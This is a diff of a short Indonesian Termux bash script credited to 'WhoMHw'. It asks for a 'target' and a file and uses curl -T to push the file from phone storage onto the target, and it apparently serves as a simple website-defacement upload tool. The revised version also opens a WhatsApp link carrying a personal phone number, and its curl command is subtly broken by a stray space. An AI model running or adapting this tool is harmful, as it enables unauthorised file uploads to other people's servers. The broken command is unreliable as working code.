@@ -1,36 +1,24 @@
-#!/xbin/bash
-#toolsWhoMHw#
+#!/bin/bash
+#usr/bin/sh
 
-echo "////////////////////////////////////////////////////////////////////////////////////////"
-echo "                                  Author:WhoMHw                                           "
-echo "                                                                               //"
-echo "                                                                               \\"
-echo "//////////////////////////////////////////////////////////////////////////////////////"
 
-echo "selamat datang kaka,siapa nama kaka?" #tulisan keluar
-read nick #membaca tulisan masuk
+echo "=============================================================================="
+echo "                          Punya W.=WhoMHw                                    "
+echo "______________________________________________________________________________"
+echo "----------------------WhoMHw ------------------------------------------------"
+echo "===========<=<=<=<=<=<=<=<==<=<=<=<=<=<==<=<==<=<><=<><=<<=<><<==<=<=<=<=<<=_"
+ echo "selamat datang kaka,siapa nama kaka?" #tulisan keluar
+read nick #membaca tulisan
 clear
- echo "##########"
-  echo "##########         ini toool milik bersama                                                       ######"
-
-   echo  "#########               WhoMHw and MR.WR.py                                                    ######"
-    echo "#########                                                                                      ######"
-     echo "##########                                                                                    ######"
-      echo "##########                                                                                   ######"
-       echo "###############№##################################################################################"
-        echo  "############################№#############################################################"
-         echo "######################################№№#################################################"
-echo "selamat datang di tools ini" $nick
-echo "tunggu bentarrr................."
-echo "masukkan target kamu : "
-read target #target
-echo "input file kamu :"
-read file #file
-echo "tunggu bentar ya tod w lagi apluod scrpit lu...."
-curl -T /storage/emulated/0/$file $target
-echo "==================================="
-echo " Tools ini gratis"
-echo " Who MHw and MR.WR.py"
-echo " Dilarang menjual belikan tools ini"
-echo " Dilarang menyalahgunakan tools ini :)"
-echo "==================================="
+echo "install dulu" $nick
+sleep 2
+termux-open https://wa.me/+6285336515046?text=hai+kaka
+echo "jangan lupas script nya ditaruh di internall ya.!!" $nick
+echo "masukkan nama target"
+read target
+echo "masukkan file kamu"
+read file
+echo "mengapluod script lu......"
+curl -T /storage/emulated/0/ $file $target
+clear
+echo "terimakasih sudah datang" $nick
